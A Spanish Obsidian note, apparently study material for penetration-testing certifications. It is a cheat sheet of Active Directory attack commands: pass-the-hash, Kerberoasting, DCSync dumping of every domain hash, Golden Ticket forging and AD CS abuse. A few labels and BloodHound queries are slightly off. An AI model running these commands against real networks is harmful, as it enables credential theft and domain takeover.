---
title: "Active Directory — Red Team"
type: note
status: active
tags:
  - seguridad
  - active-directory
  - redteam
  - windows
aliases:
  - AD Hacking
  - Active Directory Attacks
  - BloodHound
created: 2026-06-13
updated: 2026-06-13
---

# Active Directory — Red Team

> [!INFO] Fuente
> Basado en HackTheBox, TryHackMe (AD modules), BloodHound docs, y certificaciones CRTP/PEN-200.

---

## Conceptos clave de AD

| Concepto | Definicion |
|----------|------------|
| **Domain Controller (DC)** | Servidor principal, almacena la base de datos de AD |
| **Domain** | Unidad administrativa (usuarios, computadoras, grupos) |
| **Forest** | Conjunto de dominios con relacion de confianza |
| **Organizational Unit (OU)** | Contenedor para usuarios/grupos/computadoras |
| **Group Policy (GPO)** | Configuraciones aplicadas a OUs |
| **Kerberos** | Protocolo de autenticacion por defecto en AD |
| **NTLM** | Protocolo de autenticacion legacy (fallback) |
| **SPN** | Service Principal Name — identifica servicios en la red |

### Terminologia de autenticacion

```
Usuario → TGT (Ticket Granting Ticket) → KDC (Key Distribution Center)
                                      → TGS (Ticket Granting Service) → Servicio
```

---

## Fase 1: Enumeracion (sin credenciales)

### Sin credenciales (usuario de dominio)

```bash
# Con credenciales de un usuario cualquiera
ldapdomaindump ldap://dc.target.com -u 'DOMAIN\user' -p 'Password123'

# bloodhound-python (recolectar datos para BloodHound)
bloodhound-python -d target.com -u user -p 'Password123' -ns 10.10.10.1 -c all

# CrackMapExec (enumeracion rapida)
cme smb 10.10.10.0/24 -u user -p 'Password123' --users
cme smb 10.10.10.0/24 -u user -p 'Password123' --groups
cme smb 10.10.10.0/24 -u user -p 'Password123' --shares
cme smb 10.10.10.0/24 -u user -p 'Password123' --sessions
```

### Sin credenciales (null session — poco comun hoy)

```bash
# Null session (raro encontrar en Win2k16+)
rpcclient -U "" -N 10.10.10.1

# SMB null session
smbclient -L //10.10.10.1 -N
```

---

## Fase 2: Movimiento Lateral

### Pass-the-Hash (PtH)

```bash
# Tienes el hash NTLM (SAM, LSASS, NTDS.dit)
# Usalo directamente sin necesidad de password en texto claro

# CrackMapExec
cme smb 10.10.10.1 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket
psexec.py DOMAIN/Administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

wmiexec.py DOMAIN/Administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

smbexec.py DOMAIN/Administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Overpass-the-Hash

```bash
# Convertir hash NTLM en TGT de Kerberos
# En Windows: usar mimikatz o Rubeus
Rubeus.exe asktgt /domain:target.com /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0

# En Linux
getTGT.py target.com/Administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
export KRB5CCNAME=Administrator.ccache
```

### Pass-the-Ticket

```bash
# Ya tenes un ticket Kerberos, lo reusas
# Importar ticket en mimikatz
mimikatz# kerberos::ptt ticket.kirbi

# Linux
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass target.com/Administrator@dc.target.com
```

---

## Fase 3: Ataques clasicos de AD

### Kerberoasting

```bash
# Solicitar TGS para cuentas con SPN (service accounts)
# El ticket esta cifrado con el hash de la service account

# Impacket
GetUserSPNs.py target.com/user:password -dc-ip 10.10.10.1 -request

# Crack con hashcat
hashcat -m 13100 kerberos.txt wordlist.txt
```

> [!NOTE] Cuentas de servicio
> A menudo tienen passwords debiles porque son generadas automaticamente y nadie las cambia. Si el SPN corre como cuenta de dominio, crackear el hash = acceso a esa maquina.

### AS-REP Roasting

```bash
# Usuarios sin pre-autenticacion Kerberos (DONT_REQ_PREAUTH)
# Se puede solicitar TGT sin password

# Impacket
GetNPUsers.py target.com/ -dc-ip 10.10.10.1 -no-pass -usersfile users.txt

# Hashcat
hashcat -m 18200 asrep.txt wordlist.txt
```

### DCSync (el goldmine)

```bash
# Simula ser un Domain Controller y pide replicacion
# Requiere: Admin o cuenta con permisos de replicacion

# Impacket (Linux, sin tocar la maquina)
secretsdump.py target.com/Administrator:'Password123'@10.10.10.1

# Mimikatz (Windows, desde el DC)
mimikatz# lsadump::dcsync /domain:target.com /user:krbtgt
```

> [!DANGER] DCSync
> Con DCSync te llevas TODOS los hashes del dominio, incluyendo el krbtgt (Golden Ticket). Game over para la empresa.

### Golden Ticket

```bash
# Tienes el hash del krbtgt → forjar cualquier ticket
# Acceso total al dominio, persistencia absoluta

# Mimikatz
mimikatz# kerberos::golden /domain:target.com /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /id:500 /ptt
```

---

## BloodHound (mapeo de relaciones)

### Instalacion

```bash
# Neos (reemplazo moderno)
docker run -p 7474:7474 -p 7687:7687 specterops/bloodhound:latest

# BloodHound CE (nuevo, web-based)
```

### Query utiles

```cypher
# Usuarios con sesion de admin
MATCH p = (c:Computer)-[:HasSession]->(a:Admin)
RETURN p

# Grupos con usuarios que tienen DCSync rights
MATCH p = (m:User)-[:MemberOf*1..]->(:Group)-[:DCSync]->(d:Domain)
RETURN p

# Shortest path a Domain Admins
MATCH p = shortestPath((u:User)-[:MemberOf|HasSession|AdminTo|AllExtendedRights*1..]->(g:Group {name:'DOMAIN ADMINS@TARGET.LOCAL'}))
RETURN p

# Computers sin LAPS
MATCH (c:Computer) WHERE c.lapsenabled = false RETURN c
```

---

## Herramientas de AD

| Herramienta | Uso |
|-------------|-----|
| BloodHound | Mapeo de relaciones y rutas de ataque |
| CrackMapExec | Enumeracion y mov lateral automatizado |
| Impacket | Suite de scripts para AD (secretsdump, psexec, wmiexec) |
| Mimikatz | Extraccion de credenciales, golden ticket |
| Rubeus | Kerberos interaction (asktgt, kerberoast, etc.) |
| ldapdomaindump | Dumpear informacion de AD via LDAP |
| Certipy | Explotacion de AD CS (certificados) |

---

## AD CS (Certificate Services) — El nuevo vector caliente

```bash
# ESC1: certificado con SAN (subjectAltName) — suplantar cualquier user
certipy find -u user@target.com -p 'Password123' -dc-ip 10.10.10.1

# ESC8: relay de NTLM a AD CS web enrollment
ntlmrelayx.py -t http://dc.target.com/certsrv/certfnsh.asp -smb2support

# ESC1 explotacion
certipy req -u user@target.com -p 'Password123' -ca TARGET-CA -template ESC1-Template
certipy auth -pfx user.pfx -dc-ip 10.10.10.1
```

---

## Escalada local en Windows

```bash
# WinPEAS (enumeracion)
winpeas.exe

# PowerUp (comprueba vectores comunes)
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# JuicyPotato / PrintSpoofer / GodPotato (seimpersonate privilege)
# Si tenes el privilegio SeImpersonatePrivilege, podes escalar a SYSTEM
```

---

## Ver tambien

- [[SEGURIDAD/Roadmap Bug Bounty]]
- [[SEGURIDAD/Reconocimiento]]
- [[SEGURIDAD/00 - INDICE]]
